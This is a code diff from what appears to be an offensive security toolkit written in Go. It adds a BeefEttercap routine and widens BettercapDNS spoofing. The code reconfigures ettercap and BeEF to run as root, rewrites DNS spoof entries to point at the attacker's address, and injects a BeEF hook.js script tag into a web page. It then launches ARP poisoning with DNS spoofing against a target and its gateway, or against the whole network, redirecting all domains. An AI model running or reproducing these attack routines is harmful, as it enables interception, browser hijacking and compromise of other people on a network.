@@ -163,6 +163,207 @@ func PacketsResponder() {
     }
 }
 
+func BeefEttercap(userTarget string) {
+    userLhostIp, err := utils.GetDefaultIP()
+    if err != nil {
+        fmt.Println("Error getting default userLhostIp:", err)
+        os.Exit(1)
+    }
+    menus.MenuThreeFour()
+    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Scan(&userInput)
+    switch userInput {
+    case "0":
+        return
+    case "1":
+        filePath := "/etc/beef-xss/config.yaml.bak_africana"
+        if _, err := os.Stat(filePath); os.IsNotExist(err) {
+            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Scan(&userPass)
+            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
+            filesToReplacements := map[string]map[string]string{
+                "/etc/beef-xss/config.yaml": {
+                `passwd: "beef"`: newString,
+                },
+            }
+            utils.Editors(filesToReplacements)
+            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)
+
+            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
+            if _, err := os.Stat(filePath); os.IsNotExist(err) {
+                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
+                filesToReplacements := map[string]map[string]string{
+                    "/usr/lib/systemd/system/beef-xss.service": {
+                        `User=beef-xss`: `User=root`,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
+            }
+            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userIface, _ := reader.ReadString('\n')
+            userIface = strings.TrimSpace(userIface)
+            if userIface == "" {
+                userIface = "eth0"
+            }
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userLhost, _ := reader.ReadString('\n')
+            userLhost = strings.TrimSpace(userLhost)
+            if userLhost == "" {
+                userLhost = userLhostIp
+            }
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userFakeDns, _ := reader.ReadString('\n')
+            userFakeDns = strings.TrimSpace(userFakeDns)
+            if userFakeDns == "" {
+                userFakeDns = "*"
+            }
+            filePathO := "/etc/ettercap/etter.conf.bak_africana"
+            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
+                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
+                filesToReplacements := map[string]map[string]string{
+                    "/etc/ettercap/etter.conf": {
+                        `ec_uid = 65534`: `ec_uid = 0`,
+                        `ec_gid = 65534`: `ec_gid = 0`,
+                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            filePathT := "/etc/ettercap/etter.dns.bak_africana"
+            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
+                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
+                filesToReplacements := map[string]map[string]string{
+                    "/etc/ettercap/etter.dns": {
+                        `# vim:ts=8:noexpandtab`: newString,
+                     },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fileXPath := "/var/www/html/.userFiles"
+            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
+                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
+                filesToReplacements := map[string]map[string]string{
+                    "/var/www/html/index.html": {
+                        `africana-beef`: newString,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            userGateway, err := utils.GetDefaultGatewayIP()
+            if err != nil {
+                panic(err)
+            }
+            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns; systemctl --no-pager status apache2.service beef-xss.service`)
+    case "2":
+        filePath := "/etc/beef-xss/config.yaml.bak_africana"
+        if _, err := os.Stat(filePath); os.IsNotExist(err) {
+            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Scan(&userPass)
+            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
+            filesToReplacements := map[string]map[string]string{
+                "/etc/beef-xss/config.yaml": {
+                `passwd: "beef"`: newString,
+                },
+            }
+            utils.Editors(filesToReplacements)
+            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)
+
+            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
+            if _, err := os.Stat(filePath); os.IsNotExist(err) {
+                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
+                filesToReplacements := map[string]map[string]string{
+                    "/usr/lib/systemd/system/beef-xss.service": {
+                        `User=beef-xss`: `User=root`,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
+            }
+            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userIface, _ := reader.ReadString('\n')
+            userIface = strings.TrimSpace(userIface)
+            if userIface == "" {
+                userIface = "eth0"
+            }
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userLhost, _ := reader.ReadString('\n')
+            userLhost = strings.TrimSpace(userLhost)
+            if userLhost == "" {
+                userLhost = userLhostIp
+            }
+            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            userFakeDns, _ := reader.ReadString('\n')
+            userFakeDns = strings.TrimSpace(userFakeDns)
+            if userFakeDns == "" {
+                userFakeDns = "*"
+            }
+            filePathO := "/etc/ettercap/etter.conf.bak_africana"
+            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
+                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
+                filesToReplacements := map[string]map[string]string{
+                    "/etc/ettercap/etter.conf": {
+                        `ec_uid = 65534`: `ec_uid = 0`,
+                        `ec_gid = 65534`: `ec_gid = 0`,
+                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            filePathT := "/etc/ettercap/etter.dns.bak_africana"
+            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
+                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
+                filesToReplacements := map[string]map[string]string{
+                    "/etc/ettercap/etter.dns": {
+                        `# vim:ts=8:noexpandtab`: newString,
+                     },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fileXPath := "/var/www/html/.userFiles"
+            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
+                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
+                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
+                filesToReplacements := map[string]map[string]string{
+                    "/var/www/html/index.html": {
+                        `africana-beef`: newString,
+                    },
+                }
+            utils.Editors(filesToReplacements)
+            }
+            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof ///`, userLhostIp, userIface); fmt.Println()
+            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns; systemctl --no-pager status apache2.service beef-xss.service`)
+    default:
+        fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
+    }
+    fmt.Println()
+}
+
 func BeefBettercap(userTarget string) {
     userLhostIp, err := utils.GetDefaultIP()
     if err != nil {
@@ -231,7 +432,7 @@ func BeefBettercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.com, *microsoft.com, microsoft.com, *bing.com, bing.com, *.google.com, google.com, *duckduckgo.com, duckduckgo.com, *youtube.com, youtube.com, *yahoo.com, yahoo.com, *amazon.com, amazon.com, *facebook.com, facebook.com, *reddit.com, reddit.com, gstatic.com, *.gstatic.com, *qq.com, qq.com; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget); fmt.Println()
+            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget); fmt.Println()
             subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
     case "2":
         if _, err := exec.LookPath("beef-xss"); err != nil {
@@ -292,191 +493,8 @@ func BeefBettercap(userTarget string) {
                 }
             utils.Editors(filesToReplacements)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains  *.com, *microsoft.com, microsoft.com, *bing.com, bing.com, *.google.com, google.com, *duckduckgo.com, duckduckgo.com, *youtube.com, youtube.com, *yahoo.com, yahoo.com, *amazon.com, amazon.com, *facebook.com, facebook.com, *reddit.com, reddit.com, gstatic.com, *.gstatic.com, *qq.com, qq.com; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface); fmt.Println()
+            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface); fmt.Println()
             subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
-    default:
-        fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
-    }
-    fmt.Println()
-}
-
-func BeefEttercap(userTarget string) {
-    userLhostIp, err := utils.GetDefaultIP()
-    if err != nil {
-        fmt.Println("Error getting default userLhostIp:", err)
-        os.Exit(1)
-    }
-    menus.MenuThreeFour()
-    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-    fmt.Scan(&userInput)
-    switch userInput {
-    case "0":
-        return
-    case "1":
-        filePath := "/etc/beef-xss/config.yaml.bak_africana"
-        if _, err := os.Stat(filePath); os.IsNotExist(err) {
-            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            fmt.Scan(&userPass)
-            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
-            filesToReplacements := map[string]map[string]string{
-                "/etc/beef-xss/config.yaml": {
-                `passwd: "beef"`: newString,
-                },
-            }
-            utils.Editors(filesToReplacements)
-            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)
-
-            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
-            if _, err := os.Stat(filePath); os.IsNotExist(err) {
-                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
-                filesToReplacements := map[string]map[string]string{
-                    "/usr/lib/systemd/system/beef-xss.service": {
-                        `User=beef-xss`: `User=root`,
-                    },
-                }
-            utils.Editors(filesToReplacements)
-            }
-            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
-            }
-            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userIface, _ := reader.ReadString('\n')
-            userIface = strings.TrimSpace(userIface)
-            if userIface == "" {
-                userIface = "eth0"
-            }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userLhost, _ := reader.ReadString('\n')
-            userLhost = strings.TrimSpace(userLhost)
-            if userLhost == "" {
-                userLhost = userLhostIp
-            }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userFakeDns, _ := reader.ReadString('\n')
-            userFakeDns = strings.TrimSpace(userFakeDns)
-            if userFakeDns == "" {
-                userFakeDns = "0.0.0.0"
-            }
-            filePathO := "/etc/ettercap/etter.conf.bak_africana"
-            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
-                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
-                filesToReplacements := map[string]map[string]string{
-                    "/etc/ettercap/etter.conf": {
-                        `ec_uid = 65534`: `ec_uid = 0`,
-                        `ec_gid = 65534`: `ec_gid = 0`,
-                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
-                    },
-                }
-            utils.Editors(filesToReplacements)
-            }
-            filePathT := "/etc/ettercap/etter.dns.bak_africana"
-            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
-                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s%s", "*", userFakeDns, " A ", userLhost)
-                filesToReplacements := map[string]map[string]string{
-                    "/etc/ettercap/etter.dns": {
-                        `# vim:ts=8:noexpandtab`: newString,
-                     },
-                }
-            utils.Editors(filesToReplacements)
-            }
-            userGateway, err := utils.GetDefaultGatewayIP()
-            if err != nil {
-                panic(err)
-            }
-            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -T -i %s -P dns_spoof -M ARP //%s// //%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
-            subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
-    case "2":
-        filePath := "/etc/beef-xss/config.yaml.bak_africana"
-        if _, err := os.Stat(filePath); os.IsNotExist(err) {
-            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            fmt.Scan(&userPass)
-            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
-            filesToReplacements := map[string]map[string]string{
-                "/etc/beef-xss/config.yaml": {
-                `passwd: "beef"`: newString,
-                },
-            }
-            utils.Editors(filesToReplacements)
-            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)
-
-            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
-            if _, err := os.Stat(filePath); os.IsNotExist(err) {
-                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
-                filesToReplacements := map[string]map[string]string{
-                    "/usr/lib/systemd/system/beef-xss.service": {
-                        `User=beef-xss`: `User=root`,
-                    },
-                }
-            utils.Editors(filesToReplacements)
-            }
-            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
-            }
-            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userIface, _ := reader.ReadString('\n')
-            userIface = strings.TrimSpace(userIface)
-            if userIface == "" {
-                userIface = "eth0"
-            }
-            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userLhost, _ := reader.ReadString('\n')
-            userLhost = strings.TrimSpace(userLhost)
-            if userLhost == "" {
-                userLhost = userLhostIp
-            }
